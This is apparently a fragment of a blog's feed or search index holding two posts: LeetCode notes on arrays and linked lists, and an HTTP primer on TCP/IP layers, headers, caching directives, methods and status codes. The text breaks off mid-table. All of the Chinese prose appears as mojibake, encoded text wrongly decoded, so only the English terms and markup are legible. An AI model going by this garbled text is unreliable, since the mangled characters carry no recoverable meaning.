      <url>/2019/08/19/LeetCode-%E6%95%B0%E7%BB%84/</url>
      <content type="html"><![CDATA[<h3 id="1-æ•°æ®ç»“æ„"><a href="#1-æ•°æ®ç»“æ„" class="headerlink" title="1. æ•°æ®ç»“æ„"></a>1. æ•°æ®ç»“æ„</h3><ul><li><p>æ•°ç»„<br>åˆ†é…ä¸€å—è¿ç»­çš„å†…å­˜ï¼Œæ¯ä¸ªå…ƒç´ åªéœ€è¦é€šè¿‡ç´¢å¼•å°±å¯ä»¥è®¿é—®ï¼Œæ•ˆç‡ä¸º<em><code>O(1)</code></em>.æ•°ç»„è¿›è¡Œå¢åˆ æ“ä½œæ—¶ï¼Œä¼šæ¶‰åŠå¤§é‡ç‰‡æ®µçš„å¤åˆ¶ç¾¤ç§»å…ƒç´ ï¼Œæ•ˆç‡ä¸º<code>O(n)</code>ã€‚</p></li><li><p>é“¾è¡¨<br>è¿™æ—¶å€™ç”¨é“¾è¡¨å¯ä»¥çœå»è¿™äº›æ“ä½œï¼Œå®ƒçš„ç§»åŠ¨ä¿®æ”¹æ“ä½œæ•ˆç‡ä¸º<em><code>O(1)</code></em>ã€‚åŒæ—¶ä¹Ÿæ˜¯å› ä¸ºè¿™æ ·çš„ç»“æ„ï¼Œè¦è®¿é—®é“¾è¡¨é‡Œçš„å…ƒç´ å˜å¾—ä¸é‚£ä¹ˆç®€å•ï¼Œæ•ˆç‡ä¸º<em><code>O(n)</code></em>ã€‚<br><em>å•å‘é“¾è¡¨</em>ï¼šé“¾è¡¨Linked Listï¼Œæ¯ä¸ªå…ƒç´ æœ‰<code>value</code> å’Œ <code>next</code>ï¼ŒnextæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚æœ€åä¸€ä¸ªå…ƒç´ çš„nextæŒ‡å‘ç©º None<br><em>å¾ªç¯åˆ—è¡¨</em>ï¼šå¤´æŒ‡é’ˆä¸ºHead, å°¾æŒ‡é’ˆä¸ºTail, Tailçš„nextæŒ‡å‘Head<br><em>åŒå‘é“¾è¡¨</em>ï¼šæœ‰ä¸¤ä¸ªæŒ‡é’ˆ <code>prev</code> å’Œ <code>next</code>å¯ä»¥å¾€å‰èµ°ï¼Œä¹Ÿå¯ä»¥å¾€åèµ°</p></li><li><p>è·³è¡¨<br>è·³è¡¨å¯¹æ ‡çš„æ˜¯å¹³è¡¡æ ‘å’ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œæ˜¯ä¸€ç§æ’å…¥/åˆ é™¤/æœç´¢éƒ½æ˜¯<code>O(log n)</code>çš„æ•°æ®ç»“æ„ã€‚</p></li></ul><p><br></p><h3 id="2-æ•°ç»„-LeetCode"><a href="#2-æ•°ç»„-LeetCode" class="headerlink" title="2. æ•°ç»„ LeetCode"></a>2. æ•°ç»„ LeetCode</h3><h4 id="2-1-åŒºé—´"><a href="#2-1-åŒºé—´" class="headerlink" title="2.1 åŒºé—´"></a>2.1 åŒºé—´</h4><ul><li>56.åˆå¹¶åŒºé—´</li><li>57.æ’å…¥åŒºé—´</li><li>228.æ±‡æ€»åŒºé—´</li><li>349.ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†</li></ul><h3 id="3-é“¾è¡¨"><a href="#3-é“¾è¡¨" class="headerlink" title="3. é“¾è¡¨"></a>3. é“¾è¡¨</h3><h4 id="3-1-æ“ä½œèŠ‚ç‚¹"><a href="#3-1-æ“ä½œèŠ‚ç‚¹" class="headerlink" title="3.1 æ“ä½œèŠ‚ç‚¹"></a>3.1 æ“ä½œèŠ‚ç‚¹</h4><h4 id="3-2-æ“ä½œé“¾è¡¨"><a href="#3-2-æ“ä½œé“¾è¡¨" class="headerlink" title="3.2 æ“ä½œé“¾è¡¨"></a>3.2 æ“ä½œé“¾è¡¨</h4><h4 id="3-3-ç¯å½¢é“¾è¡¨"><a href="#3-3-ç¯å½¢é“¾è¡¨" class="headerlink" title="3.3 ç¯å½¢é“¾è¡¨"></a>3.3 ç¯å½¢é“¾è¡¨</h4><p>åè½¬é“¾è¡¨<br>ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹<br>ç¯å½¢é“¾è¡¨<br>ç¯å½¢é“¾è¡¨ II<br>K ä¸ªä¸€ç»„ç¿»è½¬é“¾è¡¨</p>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” HTTPå¸¸è§é—®é¢˜</title>
      <link href="/2019/08/16/HTTP/"/>
      <url>/2019/08/16/HTTP/</url>
      <content type="html"><![CDATA[<h3 id="1-TCP-IP-åè®®"><a href="#1-TCP-IP-åè®®" class="headerlink" title="1. TCP/IP åè®®"></a>1. TCP/IP åè®®</h3><p>è®¡ç®—æœºä¸ç½‘ç»œè®¾å¤‡è¦ç›¸äº’é€šä¿¡ï¼ŒåŒæ–¹å°±å¿…é¡»åŸºäºç›¸åŒçš„æ–¹æ³•ã€‚å¦‚ä½•æ¢æµ‹åˆ°é€šä¿¡ç›®æ ‡ï¼Œç”±å“ªä¸€è¾¹å…ˆå‘èµ·é€šä¿¡ã€ä½¿ç”¨å“ªç§è¯­è¨€è¿›è¡Œé€šä¿¡ï¼Œæ€æ ·ç»“æŸé€šä¿¡ç­‰è§„åˆ™éƒ½éœ€è¦äº‹å…ˆç¡®å®šã€‚æˆ‘ä»¬æŠŠè¿™ç§è§„åˆ™æˆä¸ºåè®® (protocol)ã€‚ä¸äº’è”ç½‘ç›¸å…³è”çš„åè®®é›†åˆèµ·æ¥æ€»ç§°ä¸º TCP/IPã€‚</p><ul><li><p><em>TCP/IP å„å±‚çš„ä½œç”¨</em><br>åº”ç”¨å±‚ï¼šå†³å®šäº†å‘ç”¨æˆ·æä¾›åº”ç”¨æœåŠ¡æ—¶é€šä¿¡çš„æ´»åŠ¨ã€‚å¦‚ FTP (file transfer protocolï¼Œ æ–‡æœ¬ä¼ è¾“åè®®)ï¼ŒDNS (domain name system åŸŸåç³»ç»Ÿ)ï¼Œ HTTP<br>ä¼ è¾“å±‚ï¼šTCP å’Œ UDP<br>ç½‘ç»œå±‚ï¼šç”¨æ¥å¤„ç†åœ¨ç½‘ç»œä¸ŠæµåŠ¨çš„æ•°æ®åŒ…ã€‚è¯¥å±‚è§„å®šäº†é€šè¿‡æ€æ ·çš„è·¯å¾„ï¼ˆä¼ è¾“è·¯çº¿ï¼‰åˆ°è¾¾å¯¹æ–¹è®¡ç®—æœºï¼Œå¹¶å°†æ•°æ®åŒ…ä¼ é€ç»™å¯¹æ–¹ã€‚<br>é“¾è·¯å±‚ï¼šè¿æ¥ç½‘ç»œçš„ç¡¬ä»¶éƒ¨åˆ†ã€‚</p></li><li><p><em>IP åè®®</em><br>è´Ÿè´£ä¼ è¾“ã€‚IP åè®®ç¡®ä¿æ•°æ®åŒ…ä¼ ç»™äº†å¯¹æ–¹ã€‚IP åœ°å€æŒ‡æ˜äº†èŠ‚ç‚¹è¢«åˆ†é…åˆ°çš„åœ°å€ï¼›ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨ ARP åè®®è·å– MAC åœ°å€è¿›è¡Œä¸­è½¬ã€‚</p></li><li><p><em>TCP</em><br>ç¡®ä¿å¯é æ€§ã€‚TCP åè®®å¯¹å¤§å—æ•°æ®åˆ†å‰²æˆä»¥æŠ¥æ–‡æ®µä¸ºå•ä½çš„æ•°æ®åŒ…è¿›è¡Œç®¡ç†ï¼Œå¹¶ç¡®è®¤æ•°æ®æœ€ç»ˆé€è¾¾åˆ°å¯¹æ–¹ã€‚TCP é‡‡ç”¨<strong>ä¸‰æ¬¡æ¡æ‰‹ç­–ç•¥</strong>ã€‚å‘é€ç«¯é¦–å…ˆå‘é€ä¸€ä¸ªå¸¦ SYN æ ‡å¿—çš„æ•°æ®åŒ…ç»™å¯¹æ–¹ã€‚æ¥æ”¶ç«¯æ”¶åˆ°åï¼Œå›ä¼ ä¸€ä¸ªå¸¦æœ‰ SYNï¼ŸACK æ ‡å¿—çš„æ•°æ®åŒ…ä»¥ç¤ºä¼ è¾¾ç¡®è®¤ã€‚æœ€åï¼Œå‘é€ç«¯å†å›ä¼ ä¸€ä¸ªå¸¦ ACK æ ‡å¿—çš„æ•°æ®åŒ…ï¼Œä»£è¡¨â€œæ¡æ‰‹â€ç»“æŸã€‚</p></li><li><p><em>DNS</em><br>DNS æä¾›åŸŸååˆ° IP åœ°å€ä¹‹é—´çš„è§£ææœåŠ¡ã€‚</p></li></ul><ul><li><em>URL</em><br>URL(Uniform Resource Locator, ç»Ÿä¸€èµ„æºå®šä½ç¬¦)ï¼Œæ˜¯ web æµè§ˆå™¨è®¿é—®é¡µé¢æ—¶éœ€è¦è¾“å…¥çš„åœ°å€ã€‚</li></ul><ul><li><em>URI</em><br>URI(Uniform Resource Identifier, ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦)ï¼Œæ˜¯ç”±æŸä¸ªåè®®æ–¹æ¡ˆ(http, ftp, mailto, telnet, file ç­‰)è¡¨ç¤ºçš„èµ„æºçš„å®šä½æ ‡è¯†ç¬¦ã€‚</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URIç»„æˆä¾æ¬¡ä¸ºåè®®æ–¹æ¡ˆåï¼Œç™»å½•ä¿¡æ¯ï¼ŒæœåŠ¡å™¨åœ°å€ï¼ŒæœåŠ¡å™¨ç«¯å£ï¼Œå¸¦å±‚æ¬¡çš„æ–‡ä»¶è·¯å¾„ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œç‰‡æ®µæ ‡è¯†ç¬¦</span></span><br><span class="line">http:<span class="comment">//user:pass@www.example.jp:80/dir/index.html?uid=1#ch1</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-HTTPæŠ¥æ–‡"><a href="#2-HTTPæŠ¥æ–‡" class="headerlink" title="2. HTTPæŠ¥æ–‡"></a>2. HTTPæŠ¥æ–‡</h3><p>è¯·æ±‚ä»å®¢æˆ·ç«¯å‘å‡ºï¼Œæœ€åæœåŠ¡å™¨ç«¯å“åº”è¯¥è¯·æ±‚å¹¶è¿”å›ã€‚HTTPæ˜¯ä¸€ç§ä¸ä¿å­˜çŠ¶æ€ï¼Œå³æ— çŠ¶æ€åè®®ã€‚<br>ç”¨äº HTTP åè®®äº¤äº’çš„ä¿¡æ¯è¢«ç§°ä¸º HTTP æŠ¥æ–‡ã€‚HTTP æŠ¥æ–‡æœ¬èº«æ˜¯ç”±å¤šè¡Œæ•°æ®æ„æˆçš„å­—ç¬¦ä¸²æ–‡æœ¬ã€‚</p><p><br></p><h4 id="2-1-è¯·æ±‚é¦–éƒ¨å­—æ®µ"><a href="#2-1-è¯·æ±‚é¦–éƒ¨å­—æ®µ" class="headerlink" title="2.1 è¯·æ±‚é¦–éƒ¨å­—æ®µ"></a>2.1 è¯·æ±‚é¦–éƒ¨å­—æ®µ</h4><ul><li><p><em>Connection</em><br>HTTPçš„åˆå§‹ç‰ˆæœ¬ä¸­ï¼Œæ¯è¿›è¡Œä¸€æ¬¡HTTPé€šä¿¡å°±è¦æ–­å¼€ä¸€æ¬¡TCPè¿æ¥ã€‚æ¯æ¬¡è¯·æ±‚éƒ½ä¼šé€ æˆæ— è°“çš„TCPè¿æ¥å»ºç«‹å’Œæ–­å¼€ï¼Œå¢åŠ é€šä¿¡é‡çš„å¼€é”€ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒHTTP/1.0æƒ³åˆ°äº†æŒä¹…è¿æ¥Keep-aliveã€‚åªè¦ä»»æ„ä¸€ç«¯æ²¡æœ‰æ˜ç¡®æå‡ºæ–­å¼€è¿æ¥ï¼Œåˆ™ä¿æŒTCPè¿æ¥çŠ¶æ€ã€‚åœ¨HTTP/1.1ä¸­ï¼Œæ‰€æœ‰çš„è¿æ¥é»˜è®¤éƒ½æ˜¯æŒä¹…è¿æ¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># HTTP/1.1å‰çš„é»˜è®¤è¿æ¥éƒ½æ˜¯éæŒä¹…é“¾æ¥ï¼Œå¦‚æœæƒ³ç»´æŒæŒç»­é“¾æ¥ï¼Œéœ€è¦æŒ‡å®šKeep-Alive</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line"># æœåŠ¡å™¨æƒ³æ˜ç¡®æ–­å¼€è¿æ¥æ—¶ï¼Œåˆ™æŒ‡å®šä¸º close</span><br><span class="line"></span><br><span class="line">Connection: Close</span><br></pre></td></tr></table></figure></li><li><p><em>Cache-Control</em><br>æ“ä½œç¼“å­˜çš„å·¥ä½œæœºåˆ¶</p></li></ul><table><thead><tr><th>ç¼“å­˜è¯·æ±‚æŒ‡ä»¤</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>no-cache</td><td style="text-align:center">å®¢æˆ·ç«¯å°†ä¸ä¼šæ¥æ”¶ç¼“å­˜è¿‡çš„å“åº”</td></tr><tr><td>no-store</td><td style="text-align:center">ä¸èƒ½åœ¨æœ¬åœ°å­˜å‚¨è¯·æ±‚æˆ–å“åº”çš„ä»»ä¸€éƒ¨åˆ†</td></tr><tr><td>max-age</td><td style="text-align:center">ç¼“å­˜èµ„æºçš„ç¼“å­˜æ—¶é—´æ¯”max-ageå°ï¼Œå°±æ¥å—ç¼“å­˜çš„èµ„æº</td></tr><tr><td>min-fresh</td><td style="text-align:center">æœŸæœ›åœ¨æŒ‡å®šæ—¶é—´å†…çš„å“åº”ä»æœ‰æ•ˆ</td></tr><tr><td>max-state</td><td style="text-align:center">å³ä½¿è¿‡æœŸï¼Œåªè¦ä»å¤„äºmax-stateæŒ‡å®šæ—¶é—´å†…ï¼Œä»ä¼šè¢«å®¢æˆ·ç«¯æ¥æ”¶</td></tr><tr><td>only-if-cached</td><td style="text-align:center">è¦æ±‚ç¼“å­˜æœåŠ¡å™¨ä¸é‡æ–°åŠ è½½å“åº”ï¼Œä¹Ÿä¸å†æ¬¡ç¡®è®¤èµ„æºæœ‰æ•ˆæ€§ã€‚è‹¥ç¼“å­˜æœåŠ¡å™¨æ— ååº”ï¼Œåˆ™è¿”å›504 Gateway Timeout</td></tr><tr><td>no-transform</td><td style="text-align:center">ç¼“å­˜ä¸èƒ½æ”¹å˜å®ä½“ä¸»é¢˜çš„åª’ä½“ç±»å‹ï¼Œé˜²æ­¢ç¼“å­˜æˆ–ä»£ç†å‹ç¼©å›¾ç‰‡ç­‰æ“ä½œ</td></tr></tbody></table><table><thead><tr><th>ç¼“å­˜å“åº”æŒ‡ä»¤</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>public</td><td style="text-align:center">è¡¨æ˜å…¶ä»–ç”¨æˆ·ä¹Ÿå¯ä»¥åˆ©ç”¨ç¼“å­˜</td></tr><tr><td>private</td><td style="text-align:center">åªå¯¹ç‰¹å®šç”¨æˆ·æä¾›èµ„æºç¼“å­˜çš„æœåŠ¡</td></tr><tr><td>no-cache</td><td style="text-align:center">åŸæœåŠ¡å™¨ä¸å¯¹ç¼“å­˜æœåŠ¡å™¨è¯·æ±‚ä¸­æå‡ºçš„èµ„æºæœ‰æ•ˆæ€§è¿›è¡Œç¡®è®¤ï¼Œä¸”ç¦æ­¢å…¶å¯¹ç›¸åº”èµ„æºè¿›è¡Œç¼“å­˜æ“ä½œ</td></tr><tr><td>no-store</td><td style="text-align:center">ä¸èƒ½åœ¨æœ¬åœ°å­˜å‚¨è¯·æ±‚æˆ–å“åº”çš„ä»»ä¸€éƒ¨åˆ†</td></tr><tr><td>s-maxage</td><td style="text-align:center">èµ„æºä¿å­˜ä¸ºç¼“å­˜çš„æœ€é•¿æ—¶é—´</td></tr><tr><td>must-revalidate</td><td style="text-align:center">ä»£ç†ä¼šå‘æºæœåŠ¡å™¨å†æ¬¡éªŒè¯å³å°†è¿”å›çš„å“åº”ç¼“å­˜ç›®å‰æ˜¯å¦æœ‰æ•ˆ</td></tr><tr><td>proxy-revalidate</td><td style="text-align:center">ç¼“å­˜æœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯å¸¦æœ‰è¯¥æŒ‡ä»¤çš„è¯·æ±‚è¿”å›å“åº”ä¹‹å‰ï¼Œå¿…é¡»å†æ¬¡éªŒè¯ç¼“å­˜çš„æœ‰æ•ˆæ€§</td></tr><tr><td>no-transform</td><td style="text-align:center">ç¼“å­˜ä¸èƒ½æ”¹å˜å®ä½“ä¸»é¢˜çš„åª’ä½“ç±»å‹ï¼Œé˜²æ­¢ç¼“å­˜æˆ–ä»£ç†å‹ç¼©å›¾ç‰‡ç­‰æ“ä½œ</td></tr></tbody></table><ul><li><em>Content-Type</em><br>å¸¸è§çš„åª’ä½“èµ„æºï¼š<ul><li>text/html: HTML æ ¼å¼</li><li>text/plain: çº¯æ–‡æœ¬æ ¼å¼</li><li>text/xml: XML æ ¼å¼</li><li>å›¾ç‰‡æ ¼å¼ï¼šimage/gif, image/jpeg, image/png</li><li>application/json: JSON æ•°æ®æ ¼å¼</li><li>application/x-www-form-urlencoded: form è¡¨å•æ•°æ®è¢«ç¼–ç ä¸º key/value æ ¼å¼å‘é€åˆ°æœåŠ¡å™¨ï¼ˆè¡¨å•é»˜è®¤çš„æäº¤æ•°æ®çš„æ ¼å¼ï¼‰</li><li>multipart/form-dataï¼šåœ¨è¡¨å•ä¸­è¿›è¡Œæ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œä¼šä½¿ç”¨è¯¥æ ¼å¼</li></ul></li></ul><ul><li><p><em>Content-Range</em><br>èŒƒå›´è¯·æ±‚ï¼Œå…è®¸ä½ å®ç°ä»ä¹‹å‰ä¸‹è½½ä¸­æ–­å¤„æ¢å¤ä¸‹è½½</p></li><li><p><em>Accept</em><br>é€šçŸ¥æœåŠ¡å™¨ï¼Œç”¨æˆ·ä»£ç†èƒ½å¤Ÿå¤„ç†çš„åª’ä½“ç±»å‹åŠåª’ä½“ç±»å‹</p></li></ul><p><br></p><h4 id="2-2-å“åº”é¦–éƒ¨å­—æ®µ"><a href="#2-2-å“åº”é¦–éƒ¨å­—æ®µ" class="headerlink" title="2.2 å“åº”é¦–éƒ¨å­—æ®µ"></a>2.2 å“åº”é¦–éƒ¨å­—æ®µ</h4><ul><li><em>Set-Cookie</em><br>æœåŠ¡ç«¯å‘é€çš„å“åº”æŠ¥æ–‡å†…çš„ä¸€ä¸ªå«åš Set-cookie çš„é¦–éƒ¨å­—æ®µä¿¡æ¯ï¼Œé€šçŸ¥å®¢æˆ·ç«¯ä¿å­˜ Cookieã€‚å½“ä¸‹æ¬¡å®¢æˆ·ç«¯å†å¾€è¯¥æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œå®¢æˆ·ç«¯ä¼šè‡ªåŠ¨åœ¨è¯·æ±‚æŠ¥æ–‡ä¸­åŠ å…¥ Cookie å€¼åå‘é€å‡ºå»ã€‚</li></ul><p><br></p><h4 id="2-3-å…¶ä»–"><a href="#2-3-å…¶ä»–" class="headerlink" title="2.3 å…¶ä»–"></a>2.3 å…¶ä»–</h4><ul><li>Date<br>è¡¨æ˜åˆ›å»º HTTP æŠ¥æ–‡çš„æ—¥æœŸå’Œæ—¶é—´</li><li>Transfer-Encoding<br>è§„å®šä¼ è¾“æŠ¥æ–‡ä¸»ä½“æ—¶é‡‡ç”¨çš„ç¼–ç æ–¹å¼</li><li>Upgrade<br>æ£€æµ‹æ˜¯å¦å¯ä»¥ä½¿ç”¨æ›´é«˜çš„åè®®ç‰ˆæœ¬è¿›è¡Œé€šä¿¡</li><li>Via<br>è¿½è¸ªå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„è¯·æ±‚å’Œå“åº”æŠ¥æ–‡çš„ä¼ è¾“è·¯å¾„</li><li>Authorization<br>ç”¨æˆ·ä»£ç†çš„è®¤è¯ä¿¡æ¯</li><li>Host<br>è¡¨ç¤ºè¯·æ±‚çš„èµ„æºæ‰€å¤„çš„äº’è”ç½‘ä¸»æœºåå’Œç«¯å£å·</li><li>If-Match:â€123456â€<br>å‘ŠçŸ¥æœåŠ¡å™¨åŒ¹é…èµ„æºæ‰€ç”¨çš„å®ä½“æ ‡è®° (ETag å€¼)</li><li>If-Modified-Since:<br>åœ¨æ—¥æœŸæ—¶é—´ä¹‹åï¼Œå¦‚æœè¯·æ±‚çš„èµ„æºæ²¡æœ‰æ›´æ–°è¿‡ï¼Œåˆ™è¿”å›çŠ¶æ€ç  304 Not Modified</li><li>Referrer<br>è¯·æ±‚çš„ URI æ˜¯ä»å“ªä¸ª web é¡µé¢å‘èµ·çš„</li><li>User-Agent<br>åˆ›å»ºè¯·æ±‚çš„æµè§ˆå™¨å’Œç”¨æˆ·ä»£ç†åç§°</li></ul><p><br></p><h3 id="3-è¯·æ±‚æ–¹æ³•"><a href="#3-è¯·æ±‚æ–¹æ³•" class="headerlink" title="3. è¯·æ±‚æ–¹æ³•"></a>3. è¯·æ±‚æ–¹æ³•</h3><table><thead><tr><th>HTTPæ–¹æ³•</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>GET</td><td style="text-align:center">GETè¯·æ±‚ä¼šæ˜¾ç¤ºè¯·æ±‚æŒ‡å®šçš„èµ„æºã€‚ä¸€èˆ¬æ¥è¯´GETæ–¹æ³•åº”è¯¥åªç”¨äºæ•°æ®çš„è¯»å–ï¼Œè€Œä¸åº”å½“ç”¨äºä¼šäº§ç”Ÿå‰¯ä½œç”¨çš„éå¹‚ç­‰çš„æ“ä½œä¸­ã€‚å®ƒæœŸæœ›çš„åº”è¯¥æ˜¯è€Œä¸”åº”è¯¥æ˜¯å®‰å…¨çš„å’Œå¹‚ç­‰çš„ã€‚è¿™é‡Œçš„å®‰å…¨æŒ‡çš„æ˜¯ï¼Œè¯·æ±‚ä¸ä¼šå½±å“åˆ°èµ„æºçš„çŠ¶æ€ã€‚</td></tr><tr><td>POST</td><td style="text-align:center">ä¼ è¾“å®ä½“ä¸»é¢˜</td></tr><tr><td>PUT</td><td style="text-align:center">ä¼ è¾“æ–‡ä»¶</td></tr><tr><td>HEAD</td><td style="text-align:center">è·å¾—æŠ¥æ–‡é¦–éƒ¨ï¼Œç”¨äºç¡®è®¤URIDEæœ‰æ•ˆæ€§åŠèµ„æºæ›´æ–°çš„æ—¥æœŸæ—¶é—´</td></tr><tr><td>DELETE</td><td style="text-align:center">åˆ é™¤æ–‡ä»¶</td></tr><tr><td>OPTIONS</td><td style="text-align:center">è¯¢é—®æ”¯æŒçš„æ–¹æ³•</td></tr><tr><td>TRACE</td><td style="text-align:center">è¯·æ±‚è¿æ¥åˆ°æºç›®æ ‡ä¼šé€šè¿‡ä»£ç†ä¸­è½¬ï¼Œtraceæ–¹æ³•ç”¨æ¥ç¡®è®¤è¿æ¥è¿‡ç¨‹ä¸­å‘ç”Ÿçš„ä¸€ç³»åˆ—æ“ä½œ</td></tr><tr><td>CONNECT</td><td style="text-align:center">è¦æ±‚ç”¨éš§é“åè®®è¿æ¥ä»£ç†</td></tr></tbody></table><p><br></p><h3 id="4-çŠ¶æ€ç "><a href="#4-çŠ¶æ€ç " class="headerlink" title="4. çŠ¶æ€ç "></a>4. çŠ¶æ€ç </h3><ul><li>1XX    Informationalï¼ˆè¯·æ±‚æ­£åœ¨å¤„ç†ï¼‰</li><li>2XX    Successï¼ˆè¯·æ±‚æˆåŠŸï¼‰</li><li>3XX    Redirectionï¼ˆé‡å®šå‘ï¼‰    éœ€è¦è¿›è¡Œé™„åŠ æ“ä½œä»¥å®Œæˆè¯·æ±‚</li><li>4XX    Client Errorï¼ˆå®¢æˆ·ç«¯é”™è¯¯ï¼‰</li><li>5XX    Server Errorï¼ˆæœåŠ¡å™¨é”™è¯¯ï¼‰</li></ul><table><thead><tr><th>çŠ¶æ€ç </th><th style="text-align:right">æè¿°</th></tr></thead><tbody><tr><td><code>100 Continue</code></td><td style="text-align:right">ä¸´æ—¶å“åº”,è¡¨æ˜å®¢æˆ·ç«¯åº”è¯¥ç»§ç»­è¯·æ±‚</td></tr><tr><td><code>101 Switching Protocol</code></td><td style="text-align:right">æœåŠ¡å™¨æ­£åœ¨åˆ‡æ¢åè®®</td></tr><tr><td><code>102 Processing (WebDAV)</code></td><td style="text-align:right">æœåŠ¡å™¨å·²æ”¶åˆ°å¹¶æ­£åœ¨å¤„ç†ï¼Œä½†æ²¡æœ‰å“åº”å¯ç”¨ã€‚</td></tr><tr><td>2XX è¡¨ç¤ºæˆåŠŸå¤„ç†äº†è¯·æ±‚çš„çŠ¶æ€ä»£ç ã€‚</td><td style="text-align:right"></td></tr><tr><td><code>200 OK</code></td><td style="text-align:right">æœåŠ¡å™¨å·²æˆåŠŸå¤„ç†äº†è¯·æ±‚ã€‚</td></tr><tr><td><code>201 Created</code></td><td style="text-align:right">è¯·æ±‚æˆåŠŸå¹¶ä¸”æœåŠ¡å™¨åˆ›å»ºäº†æ–°çš„èµ„æº,é€šå¸¸æ˜¯PUTè¯·æ±‚åçš„å“åº”ã€‚</td></tr><tr><td><code>202 Accepted</code></td><td style="text-align:right">æœåŠ¡å™¨å·²æ¥å—è¯·æ±‚ï¼Œä½†å°šæœªå¤„ç†ã€‚</td></tr><tr><td><code>203 Non-Authoritative Information</code></td><td style="text-align:right">æœåŠ¡å™¨å·²æˆåŠŸå¤„ç†äº†è¯·æ±‚ï¼Œä½†è¿”å›çš„ä¿¡æ¯å¯èƒ½æ¥è‡ªå¦ä¸€æ¥æºã€‚</td></tr><tr><td><code>204 No Content</code></td><td style="text-align:right">æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†è¯·æ±‚ï¼Œä½†æ²¡æœ‰è¿”å›ä»»ä½•å†…å®¹ã€‚</td></tr><tr><td><code>205 Reset Content</code></td><td style="text-align:right">æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†è¯·æ±‚ï¼Œä½†æ²¡æœ‰è¿”å›ä»»ä½•å†…å®¹ã€‚</td></tr><tr><td><code>206 Partial Content</code></td><td style="text-align:right">æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†éƒ¨åˆ† GET è¯·æ±‚ã€‚</td></tr><tr><td>3å¼€å¤´ï¼Œè¯·æ±‚è¢«é‡å®šå‘ï¼Œè¡¨ç¤ºè¦å®Œæˆè¯·æ±‚ï¼Œéœ€è¦è¿›ä¸€æ­¥æ“ä½œã€‚</td><td style="text-align:right"></td></tr><tr><td><code>300 Multiple Choice</code></td><td style="text-align:right">æœåŠ¡å™¨å¯æ ¹æ®è¯·æ±‚è€… (user agent) é€‰æ‹©ä¸€é¡¹æ“ä½œï¼Œæˆ–æä¾›æ“ä½œåˆ—è¡¨ä¾›è¯·æ±‚è€…é€‰æ‹©ã€‚</td></tr><tr><td><code>301 Moved Permanently</code></td><td style="text-align:right">è¯·æ±‚çš„ç½‘é¡µå·²æ°¸ä¹…ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚æœåŠ¡å™¨è¿”å›æ­¤å“åº”æ—¶ï¼Œä¼šè‡ªåŠ¨å°†è¯·æ±‚è€…è½¬åˆ°æ–°ä½ç½®ã€‚</td></tr><tr><td><code>302 Found</code></td><td style="text-align:right">æœåŠ¡å™¨ç›®å‰ä»ä¸åŒä½ç½®çš„ç½‘é¡µå“åº”è¯·æ±‚ï¼Œä½†è¯·æ±‚è€…åº”ç»§ç»­ä½¿ç”¨åŸæœ‰ä½ç½®æ¥è¿›è¡Œä»¥åçš„è¯·æ±‚ã€‚</td></tr><tr><td><code>303 See Other</code></td><td style="text-align:right">è¯·æ±‚è€…åº”å½“å¯¹ä¸åŒçš„ä½ç½®ä½¿ç”¨å•ç‹¬çš„ GET è¯·æ±‚æ¥æ£€ç´¢å“åº”æ—¶ï¼ŒæœåŠ¡å™¨è¿”å›æ­¤ä»£ç ã€‚</td></tr><tr><td><code>304 Not Modified</code></td><td style="text-align:right">ä¸Šæ¬¡è¯·æ±‚åï¼Œè¯·æ±‚çš„ç½‘é¡µæœªä¿®æ”¹è¿‡ã€‚æœåŠ¡å™¨è¿”å›æ­¤å“åº”æ—¶ï¼Œä¸ä¼šè¿”å›ç½‘é¡µå†…å®¹ã€‚</td></tr><tr><td><code>307 Temporary Redirect</code></td><td style="text-align:right">æœåŠ¡å™¨ç›®å‰ä»ä¸åŒä½ç½®çš„ç½‘é¡µå“åº”è¯·æ±‚ï¼Œä½†è¯·æ±‚è€…åº”ç»§ç»­ä½¿ç”¨åŸæœ‰ä½ç½®æ¥è¿›è¡Œä»¥åçš„è¯·æ±‚ã€‚</td></tr><tr><td>4å¼€å¤´ ï¼ˆè¯·æ±‚é”™è¯¯ï¼‰è¿™äº›çŠ¶æ€ä»£ç è¡¨ç¤ºè¯·æ±‚å¯èƒ½å‡ºé”™ï¼Œå¦¨ç¢äº†æœåŠ¡å™¨çš„å¤„ç†ã€‚</td><td style="text-align:right"></td></tr><tr><td><code>400 Bad Request</code></td><td style="text-align:right">æœåŠ¡å™¨ä¸ç†è§£è¯·æ±‚çš„è¯­æ³•ã€‚</td></tr><tr><td><code>401 Unauthorized</code></td><td style="text-align:right">è¯·æ±‚è¦æ±‚èº«ä»½éªŒè¯</td></tr><tr><td><code>403 Forbidden</code></td><td style="text-align:right">æœåŠ¡å™¨æ‹’ç»è¯·æ±‚ã€‚</td></tr><tr><td><code>404 Not Found</code></td><td 